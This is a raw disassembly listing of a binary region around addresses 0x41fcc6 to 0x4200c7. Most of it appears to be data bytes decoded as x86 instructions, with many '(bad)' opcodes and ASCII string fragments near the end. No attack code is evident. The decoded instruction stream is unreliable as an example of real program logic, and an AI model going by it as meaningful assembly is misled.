  41fcc6:	int3   
  41fcc7:	dec    ecx
  41fcc8:	inc    ebp
  41fcc9:	int3   
  41fcca:	lahf   
  41fccb:	ins    DWORD PTR es:[edi],dx
  41fccc:	enter  0x8df9,0x4
  41fcd0:	hlt    
  41fcd1:	inc    ebp
  41fcd2:	shr    BYTE PTR [eax],0x1e
  41fcd5:	inc    ecx
  41fcd6:	(bad)  
  41fcd7:	test   eax,0xd8102df0
  41fcdc:	repnz xor bl,al
  41fcdf:	pop    esi
  41fce0:	xor    bl,ah
  41fce2:	push   esp
  41fce3:	inc    esi
  41fce4:	mov    ecx,0x3794a972
  41fce9:	mov    cl,0xcb
  41fceb:	call   0x6d7856e0
  41fcf0:	xchg   edx,eax
  41fcf1:	setno  BYTE PTR [esi-0x7bde4c21]
  41fcf8:	fsubr  DWORD PTR [edi+ebp*8]
  41fcfb:	mov    dh,BYTE PTR [ebx-0x6e]
  41fcfe:	repz push edi
  41fd00:	mov    eax,ds:0x19d0ac6e
  41fd05:	sbb    al,0x10
  41fd07:	jecxz  0x41fcf3
  41fd09:	jnp    0x41fc90
  41fd0b:	popf   
  41fd0c:	loope  0x41fc93
  41fd0e:	mov    WORD PTR [eax-0x6f67e84e],gs
  41fd14:	ins    DWORD PTR es:[edi],dx
  41fd15:	sti    
  41fd16:	push   cs
  41fd17:	xor    eax,0x56c55d0a
  41fd1c:	dec    ecx
  41fd1d:	push   0xe30aad9d
  41fd22:	add    ecx,DWORD PTR [edx+0x37]
  41fd25:	mov    ds:0xc672570,eax
  41fd2a:	sub    al,0xf4
  41fd2c:	sar    al,1
  41fd2e:	mov    ah,BYTE PTR [esi+0x20]
  41fd31:	popf   
  41fd32:	xchg   ebp,eax
  41fd33:	shr    ebp,0x5c
  41fd36:	(bad)  
  41fd37:	cli    
  41fd38:	cdq    
  41fd39:	fsub   DWORD PTR [ebx+0x34bb8a32]
  41fd3f:	push   edx
  41fd40:	pop    eax
  41fd42:	mov    dh,0xbb
  41fd44:	shl    BYTE PTR [eax],1
  41fd46:	dec    ebp
  41fd47:	lods   eax,DWORD PTR ds:[esi]
  41fd48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd49:	dec    edx
  41fd4a:	(bad)  
  41fd4b:	pop    ecx
  41fd4c:	or     al,0xb1
  41fd4e:	lods   eax,DWORD PTR ds:[esi]
  41fd4f:	clc    
	...
  41fd58:	add    BYTE PTR [eax],al
  41fd5a:	add    BYTE PTR [edx],dl
  41fd5c:	xlat   BYTE PTR ds:[ebx]
  41fd5d:	repz or esi,edi
  41fd60:	das    
  41fd61:	cli    
  41fd62:	fist   WORD PTR [ecx]
  41fd64:	dec    ebx
  41fd65:	es nop
  41fd67:	or     eax,0x2d2c11d3
  41fd6c:	stos   BYTE PTR es:[edi],al
  41fd6d:	add    DWORD PTR [eax],eax
  41fd6f:	lods   eax,DWORD PTR ds:[esi]
  41fd70:	add    BYTE PTR [eax],al
  41fd72:	add    BYTE PTR [ebx],bh
  41fd74:	add    esp,DWORD PTR [ebx+0x7e]
  41fd77:	push   esp
  41fd78:	or     BYTE PTR [ebx+ecx*4],bl
  41fd7b:	adc    ebx,esp
  41fd7d:	adc    al,0xa
  41fd7f:	mov    esi,0xde6c09c4
  41fd84:	xchg   edx,eax
  41fd85:	pop    ebx
  41fd86:	xor    edi,DWORD PTR [ebp-0x76]
  41fd89:	xchg   esi,eax
  41fd8a:	outs   dx,BYTE PTR ds:[esi]
  41fd8b:	jmp    0x41fd1c
  41fd8d:	dec    esp
  41fd8e:	mov    ?,edi
  41fd90:	sbb    DWORD PTR [ebx-0x6e],ecx
  41fd93:	je     0x41fd2b
  41fd95:	lahf   
  41fd96:	(bad)  
  41fd97:	push   ecx
  41fd98:	xchg   ebx,eax
  41fd99:	sbb    DWORD PTR [esp+ebp*8],ecx
  41fd9c:	add    DWORD PTR [edx+0x6a],ebx
  41fd9f:	push   esp
  41fda0:	fsub   QWORD PTR [ebp-0xf]
  41fda3:	inc    edi
  41fda4:	mov    eax,ds:0xa541424b
  41fda9:	jecxz  0x41fe01
  41fdab:	mov    ss,WORD PTR [esi+ebp*4-0x2c]
  41fdaf:	outs   dx,BYTE PTR cs:[esi]
  41fdb1:	push   0x1d
  41fdb3:	and    BYTE PTR [edx-0x3f2f6287],dl
  41fdb9:	lods   al,BYTE PTR ds:[esi]
  41fdba:	ss cs (bad) 
  41fdbe:	xchg   edx,eax
  41fdbf:	adc    dh,ah
  41fdc1:	sub    DWORD PTR [esi],0x39
  41fdc4:	sub    al,BYTE PTR [ecx]
  41fdc6:	xchg   ebx,eax
  41fdc7:	lahf   
  41fdc8:	sbb    BYTE PTR [edx+eiz*1-0x612d171],dl
  41fdcf:	add    DWORD PTR [ebx+0x4b8fdc4],ebp
  41fdd5:	les    esi,FWORD PTR [edi-0x7e]
  41fdd8:	inc    edx
  41fdd9:	dec    eax
  41fdda:	dec    edx
  41fddb:	repz imul ecx,DWORD PTR [ecx+0x3b],0x11
  41fde0:	push   ebx
  41fde1:	sub    eax,0xed9a3f03
  41fde6:	sbb    BYTE PTR [esi+edx*1+0x6674a46],ch
  41fded:	fwait
  41fdee:	data16 cmp al,BYTE PTR [edx+0x638933c5]
  41fdf5:	ins    DWORD PTR es:[edi],dx
  41fdf6:	test   DWORD PTR [ebp+0x9a40843],eax
  41fdfc:	pushf  
  41fdfd:	fmul   QWORD PTR [ebx]
  41fdff:	lds    edx,FWORD PTR [edi+0x3f4a8613]
  41fe05:	rcr    BYTE PTR [ecx+edi*1+0x40f6f4e6],cl
  41fe0c:	xchg   edx,eax
  41fe0d:	push   ebp
  41fe0e:	adc    DWORD PTR [edi+0x20d25f7a],ecx
  41fe14:	mov    ah,0x55
  41fe16:	fs push 0xffffffaa
  41fe19:	or     ebp,DWORD PTR [ecx]
  41fe1b:	push   es
  41fe1c:	push   ecx
  41fe1d:	xchg   ecx,eax
  41fe1e:	inc    eax
  41fe1f:	inc    esp
	...
  41fe28:	add    BYTE PTR [eax],al
  41fe2a:	add    BYTE PTR [edx],dl
  41fe2c:	mov    edx,0xe6f8c6d8
  41fe31:	push   ds
  41fe32:	(bad)  
  41fe33:	adc    bl,dh
  41fe35:	cwde   
  41fe36:	out    dx,al
  41fe37:	adc    dh,cl
  41fe39:	js     0x41fdda
  41fe3b:	fisubr DWORD PTR [edx+0xad0001]
  41fe41:	add    BYTE PTR [eax],al
  41fe43:	mov    dl,0x9b
  41fe45:	push   0x56e2d4a3
  41fe4a:	(bad)
  41fe4d:	mov    ebp,0xd87f840f
  41fe52:	or     DWORD PTR [eax-0x68da64b2],ebx
  41fe58:	pop    ds
  41fe59:	(bad)  
  41fe5a:	fmulp  st(4),st
  41fe5c:	cmp    eax,0x226f70b7
  41fe61:	pusha  
  41fe62:	adc    BYTE PTR [ebx+0x7],ah
  41fe65:	and    DWORD PTR [edx-0x39],0xffffffae
  41fe69:	mov    ds:0xcf5e3704,al
  41fe6e:	stc    
  41fe6f:	sbb    al,0x20
  41fe71:	push   ds
  41fe72:	in     eax,dx
  41fe73:	push   cs
  41fe74:	jne    0x41fe79
  41fe76:	ja     0x41fee8
  41fe78:	cwde   
  41fe79:	or     esp,edi
  41fe7b:	lds    eax,FWORD PTR [ebp-0xb2ba70e]
  41fe81:	sub    esi,DWORD PTR [ebp+0x51]
  41fe84:	mov    esi,0x45d24177
  41fe89:	inc    edi
  41fe8a:	push   eax
  41fe8b:	mov    esp,0x2c8627bd
  41fe90:	imul   esp,DWORD PTR [ebx],0x7f
  41fe93:	dec    eax
  41fe94:	nop
  41fe95:	es (bad) 
  41fe97:	in     eax,0x23
  41fe99:	out    0xaa,eax
  41fe9b:	(bad)  
  41fe9c:	addr16 mov bl,0x1c
  41fea0:	push   ecx
  41fea1:	mov    dh,BYTE PTR [eax]
  41fea3:	das    
  41fea4:	ss inc ecx
  41fea6:	fild   QWORD PTR [ebp-0x4aebab01]
  41feac:	rcr    DWORD PTR [ecx],cl
  41feae:	repnz test ebp,0xb3c022d2
  41feb5:	femms  
  41feb7:	fstp   DWORD PTR [edx+0x2095d8dd]
  41febd:	aaa    
  41febe:	dec    ecx
  41febf:	imul   esi,edi,0xffffffec
  41fec2:	sub    DWORD PTR [ebp+esi*2-0x58f3f03d],edx
  41fec9:	cmp    edi,ecx
  41fecb:	imul   edi
  41fecd:	xor    DWORD PTR [edx-0xbf2a6cb],ebp
  41fed3:	and    edx,edx
  41fed5:	ror    DWORD PTR [ebx+0x59a39554],1
  41fedb:	sub    al,0xf
  41fedd:	aam    0x51
  41fedf:	int    0x31
  41fee1:	inc    esp
  41fee2:	push   esi
  41fee3:	xchg   DWORD PTR [ebx+0x52a1f0f7],esi
  41fee9:	(bad)  
  41feea:	imul   ecx,ebx,0x7fb85abe
	...
  41fefc:	nop
  41fefd:	inc    edx
  41fefe:	add    BYTE PTR [eax+edx*4],al
  41ff01:	inc    edx
  41ff02:	add    BYTE PTR [eax],cl
  41ff04:	nop
  41ff05:	inc    edx
  41ff06:	add    BYTE PTR [eax+edx*4],cl
  41ff09:	inc    edx
  41ff0a:	add    BYTE PTR [eax],dl
  41ff0c:	nop
  41ff0d:	inc    edx
  41ff0e:	add    BYTE PTR [eax+edx*4],dl
  41ff11:	inc    edx
  41ff12:	add    BYTE PTR [eax],bl
  41ff14:	nop
  41ff15:	inc    edx
  41ff16:	add    BYTE PTR [eax+edx*4],bl
  41ff19:	inc    edx
  41ff1a:	add    BYTE PTR [esi+0x49],cl
  41ff1d:	dec    esi
  41ff1e:	pop    edi
  41ff1f:	pop    edx
  41ff20:	dec    edx
  41ff21:	inc    ecx
  41ff22:	xor    eax,DWORD PTR [eax]
  41ff24:	push   ebx
  41ff25:	push   edi
  41ff26:	inc    edi
  41ff27:	cmp    DWORD PTR [edi+0x41],ebx
  41ff2a:	pop    eax
  41ff2b:	ss push esi
  41ff2d:	pop    ecx
  41ff2e:	add    BYTE PTR [ebx+0x43],dl
  41ff31:	inc    ebp
  41ff32:	pop    edi
  41ff33:	inc    ecx
  41ff34:	pop    eax
  41ff35:	push   edi
  41ff36:	dec    eax
  41ff37:	inc    edx
  41ff38:	pop    edi
  41ff39:	cmp    DWORD PTR [ecx+0x4d],ecx
  41ff3c:	dec    ecx
  41ff3d:	add    BYTE PTR [ecx+0x46],al
  41ff40:	cmp    DWORD PTR [edx],esi
  41ff42:	xor    ebx,DWORD PTR [edi+0x32]
  41ff45:	aaa    
  41ff46:	inc    esp
  41ff47:	inc    esp
  41ff48:	pop    edi
  41ff49:	xor    eax,0x41545800
  41ff4e:	pop    edi
  41ff4f:	push   ecx
  41ff50:	push   esp
  41ff51:	inc    esi
  41ff52:	push   ebp
  41ff53:	cmp    DWORD PTR [eax],eax
  41ff55:	push   edi
  41ff56:	push   ebp
  41ff57:	inc    ecx
  41ff58:	xor    dh,BYTE PTR [ebx]
  41ff5a:	xor    ebx,DWORD PTR [edi+0x4e]
  41ff5d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff61:	cmp    DWORD PTR [edi+0x38],ebx
  41ff64:	dec    ecx
  41ff65:	cmp    DWORD PTR [edx+0x36],ebx
  41ff68:	pop    edi
  41ff69:	dec    edx
  41ff6a:	xor    BYTE PTR [edx+0x34],cl
  41ff6d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff71:	xor    esi,DWORD PTR [eax]
  41ff73:	pop    edi
  41ff74:	inc    edx
  41ff75:	dec    ebx
  41ff76:	pop    eax
  41ff77:	pop    eax
  41ff78:	xor    eax,0x51414d00
  41ff7d:	pop    edi
  41ff7e:	inc    ecx
  41ff7f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff82:	inc    ecx
  41ff83:	dec    ebx
  41ff84:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff8a:	inc    ebp
  41ff8b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff8e:	ss dec eax
  41ff90:	dec    ebx
  41ff91:	add    BYTE PTR [ebp+0x57],al
  41ff94:	xor    DWORD PTR [edi+0x31],ebx
  41ff97:	dec    ebx
  41ff98:	xor    eax,DWORD PTR [ecx+0x30]
  41ff9b:	push   ebx
  41ff9c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ffa0:	aaa    
  41ffa1:	pop    edi
  41ffa2:	push   edx
  41ffa3:	dec    eax
  41ffa4:	dec    ebp
  41ffa5:	cmp    BYTE PTR [edi+0x37],bl
  41ffa8:	inc    esi
  41ffa9:	xor    eax,0x35005500
  41ffae:	add    BYTE PTR [ebx+0x0],al
  41ffb1:	pop    edi
  41ffb2:	add    BYTE PTR [ecx+0x0],bl
  41ffb5:	dec    ecx
  41ffb6:	add    BYTE PTR [ebx+0x0],dl
  41ffb9:	xor    al,BYTE PTR [eax]
  41ffbb:	pop    edi
  41ffbc:	add    BYTE PTR [edx+0x0],dl
  41ffbf:	add    BYTE PTR [eax],al
  41ffc1:	push   eax
  41ffc2:	add    BYTE PTR [ebp+0x0],dl
  41ffc5:	dec    ecx
  41ffc6:	add    BYTE PTR [eax],dh
  41ffc8:	add    BYTE PTR [edi+0x0],bl
  41ffcb:	inc    ebx
  41ffcc:	add    BYTE PTR [esi],dh
  41ffce:	add    BYTE PTR [ebp+0x0],al
  41ffd1:	xor    al,BYTE PTR [eax]
  41ffd3:	pop    edi
  41ffd4:	add    BYTE PTR [ebp+0x0],cl
  41ffd7:	xor    al,0x0
  41ffd9:	dec    edx
  41ffda:	add    BYTE PTR [edx+0x0],dl
  41ffdd:	push   ebp
  41ffde:	add    BYTE PTR [eax],al
  41ffe0:	add    BYTE PTR [esi+0x0],cl
  41ffe3:	cmp    DWORD PTR [eax],eax
  41ffe5:	push   eax
  41ffe6:	add    BYTE PTR [edi+0x0],bl
  41ffe9:	push   ebp
  41ffea:	add    BYTE PTR [ecx],bh
  41ffec:	add    BYTE PTR [esi],dh
  41ffee:	add    BYTE PTR [eax],dh
  41fff0:	add    BYTE PTR [ecx],dh
  41fff2:	add    BYTE PTR [edi+0x0],bl
  41fff5:	dec    edi
  41fff6:	add    BYTE PTR [esi+0x0],cl
  41fff9:	push   esp
  41fffa:	add    BYTE PTR [eax],bh
  41fffc:	add    BYTE PTR [eax],al
  41fffe:	add    BYTE PTR [eax+eax*1+0x34],cl
  420002:	add    BYTE PTR [eax+eax*1+0x31],al
  420006:	add    BYTE PTR [edi+0x0],bl
  420009:	dec    ebx
  42000a:	add    BYTE PTR [ecx],dh
  42000c:	add    BYTE PTR [ebp+0x0],al
  42000f:	pop    edi
  420010:	add    BYTE PTR [edx+0x0],bl
  420013:	add    BYTE PTR [eax],al
  420015:	push   esp
  420016:	add    BYTE PTR [edi],dh
  420018:	add    BYTE PTR [ebx+0x0],al
  42001b:	pop    edi
  42001c:	add    BYTE PTR [edx+0x0],al
  42001f:	xor    al,BYTE PTR [eax]
  420021:	xor    DWORD PTR [eax],eax
  420023:	push   ebx
  420024:	add    BYTE PTR [ecx],dh
  420026:	add    BYTE PTR [ecx],bh
  420028:	add    BYTE PTR [edx+0x0],al
  42002b:	add    BYTE PTR [eax],al
  42002d:	inc    edi
  42002e:	add    BYTE PTR [ebp+0x0],al
  420031:	xor    al,0x0
  420033:	cmp    BYTE PTR [eax],al
  420035:	add    BYTE PTR [eax],al
  420037:	add    BYTE PTR [eax+0x42],dl
  42003a:	add    BYTE PTR [eax+edx*2],al
  42003d:	inc    edx
  42003e:	add    BYTE PTR [eax],cl
  420040:	push   eax
  420041:	inc    edx
  420042:	add    BYTE PTR [eax+edx*2],cl
  420045:	inc    edx
  420046:	add    BYTE PTR [eax],dl
  420048:	push   eax
  420049:	inc    edx
  42004a:	add    BYTE PTR [eax+edx*2],dl
  42004d:	inc    edx
  42004e:	add    BYTE PTR [eax],bl
  420050:	push   eax
  420051:	inc    edx
  420052:	add    BYTE PTR [eax+edx*2],bl
  420055:	inc    edx
  420056:	add    BYTE PTR [eax],ah
  420058:	push   eax
  420059:	inc    edx
  42005a:	add    BYTE PTR [eax+edx*2],ah
  42005d:	inc    edx
  42005e:	add    BYTE PTR [eax],ch
  420060:	push   eax
  420061:	inc    edx
	...
  420072:	add    BYTE PTR [eax],al
  420074:	call   0x0:0x4d3ef2
  42007b:	add    BYTE PTR [edx+0x1000200],ah
  420081:	add    BYTE PTR [eax],al
  420083:	add    BYTE PTR [ecx],al
  420085:	add    BYTE PTR [eax],al
  420087:	add    BYTE PTR [ecx],al
  420089:	add    BYTE PTR [eax],al
  42008b:	add    BYTE PTR [eax-0x63fffe00],bl
  420091:	add    BYTE PTR [edx],al
  420093:	add    BYTE PTR [eax-0x23fffe00],ah
  420099:	cmp    al,0x0
  42009b:	add    BYTE PTR [esi+0x200],ch
  4200a1:	add    BYTE PTR [edi+0x6f],dl
  4200a4:	jb     0x42010a
  4200a6:	push   edi
  4200a7:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4200ae:	aas    
  4200af:	inc    ebx
  4200b0:	ins    BYTE PTR es:[edi],dx
  4200b1:	outs   dx,DWORD PTR ds:[esi]
  4200b2:	jae    0x420119
  4200b4:	push   edi
  4200b5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4200bc:	popa   
  4200bd:	je     0x420128
  4200bf:	outs   dx,DWORD PTR ds:[esi]
  4200c0:	outs   dx,BYTE PTR ds:[esi]
  4200c1:	inc    ebx
  4200c2:	ins    BYTE PTR es:[edi],dx
  4200c3:	outs   dx,DWORD PTR ds:[esi]
  4200c4:	jae    0x42012b
  4200c6:	push   edi
  4200c7:	imul   eax,DWORD PTR [eax],0x0
	...
